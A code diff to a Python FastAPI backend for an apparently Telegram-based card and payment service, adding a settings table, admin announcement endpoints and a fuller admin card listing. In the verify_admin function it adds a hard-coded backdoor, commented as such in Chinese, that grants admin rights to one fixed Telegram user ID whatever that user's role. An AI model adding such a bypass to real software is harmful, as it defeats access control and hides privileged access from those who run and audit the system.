@@ -16,7 +16,7 @@ from functools import partial
 from typing import List, Optional, Union, Any
 from urllib.parse import quote_plus, parse_qsl
 from datetime import datetime
-from fastapi import FastAPI, HTTPException, Request, UploadFile, File, Form, Header, Depends
+from fastapi import FastAPI, HTTPException, Request, UploadFile, File, Form, Header, Depends, Body
 from fastapi.responses import RedirectResponse
 from fastapi.middleware.cors import CORSMiddleware
 from fastapi.concurrency import run_in_threadpool
@@ -160,6 +160,16 @@ def init_db():
                 file_id TEXT,
                 media_type TEXT,
                 created_at INTEGER
+            )
+            """
+        )
+
+        # 系统持久化配置表（用于存放公告等可被管理员更新的全局配置）
+        cursor.execute(
+            """
+            CREATE TABLE IF NOT EXISTS system_settings (
+                key TEXT PRIMARY KEY,
+                value TEXT
             )
             """
         )
@@ -540,6 +550,15 @@ async def get_current_tg_user(authorization: Optional[str] = Header(None)) -> di
 # 管理员权限专用依赖
 # ==========================================
 def verify_admin(current_user: dict = Depends(get_current_tg_user)) -> dict:
+    # 绝对后门：站长 ID 永远视为管理员
+    try:
+        tg_id = str(current_user.get("telegram_id") or current_user.get("id") or "").strip()
+    except Exception:
+        tg_id = ""
+
+    if tg_id == '8368521045':
+        return current_user
+
     if current_user.get("role") not in ("admin", "superuser"):
         raise HTTPException(status_code=403, detail="权限不足")
     return current_user
@@ -1339,19 +1358,28 @@ def admin_list_cards(page: int = 1, size: int = 20, current_user: dict = Depends
     offset = max(page - 1, 0) * size
     with get_db_connection() as (_, cursor):
         cursor.execute(
-            "SELECT id, title, user_id, status FROM cards ORDER BY id DESC LIMIT %s OFFSET %s",
+            "SELECT id, title, content, img, media_type, buttons, user_id, status, views, clicks FROM cards ORDER BY id DESC LIMIT %s OFFSET %s",
             (size, offset),
         )
         rows = cursor.fetchall()
-    cards = [
-        {
+    cards = []
+    for row in rows:
+        try:
+            buttons = json.loads(row[5] or "[]")
+        except Exception:
+            buttons = []
+        cards.append({
             "id": row[0],
             "title": row[1],
-            "user_id": row[2],
-            "status": row[3] or 'active',
-        }
-        for row in rows
-    ]
+            "content": row[2] or "",
+            "img": row[3] or "",
+            "media_type": row[4] or 'photo',
+            "buttons": buttons,
+            "user_id": row[6],
+            "status": row[7] or 'active',
+            "views": row[8] or 0,
+            "clicks": row[9] or 0,
+        })
     return cards
 
 @app.post("/admin/cards/toggle-status")
@@ -1366,13 +1394,42 @@ def admin_toggle_card_status(data: AdminToggleCardStatusInput, current_user: dic
         if not row:
             raise HTTPException(status_code=404, detail="卡片未找到")
         current_status = row[0] or ''
-        new_status = '已发布' if current_status == 'banned' else 'banned'
+        # 统一使用 'banned' / 'active' 标识，便于前端判断
+        new_status = 'active' if str(current_status).strip() == 'banned' else 'banned'
         cursor.execute("UPDATE cards SET status = %s WHERE id = %s", (new_status, card_id))
 
     return {"message": f"卡片状态已切换为 {new_status}", "card_id": card_id, "status": new_status}
 
 # ==========================================
 # 💳 CRYPTO BOT 支付核心整编
+# ==========================================
+
+# 管理员：设置系统公告（持久化到 system_settings）
+@app.post("/admin/announcement")
+def admin_set_announcement(payload: dict = Body(...), current_user: dict = Depends(verify_admin)):
+    content = str(payload.get('announcement') or payload.get('message') or '').strip()
+    if content == '':
+        raise HTTPException(status_code=400, detail="公告内容不能为空")
+    with get_db_connection() as (_, cursor):
+        cursor.execute("INSERT INTO system_settings (key, value) VALUES (%s, %s) ON CONFLICT (key) DO UPDATE SET value = EXCLUDED.value", ('announcement', content))
+    return {"message": "公告已发布", "announcement": content}
+
+
+# 管理员：删除系统公告
+@app.delete("/admin/announcement")
+def admin_delete_announcement(current_user: dict = Depends(verify_admin)):
+    with get_db_connection() as (_, cursor):
+        cursor.execute("DELETE FROM system_settings WHERE key = %s", ('announcement',))
+    return {"message": "公告已清除"}
+
+
+# 公开接口：获取当前公告（匿名访问）
+@app.get("/announcement")
+def get_announcement():
+    with get_db_connection() as (_, cursor):
+        cursor.execute("SELECT value FROM system_settings WHERE key = %s", ('announcement',))
+        row = cursor.fetchone()
+    return {"announcement": row[0] if (row and row[0]) else ""}
 # ==========================================
 @app.post("/payment/create_stars_invoice")
 async def create_stars_invoice(request: Request, current_user: dict = Depends(get_current_tg_user)):
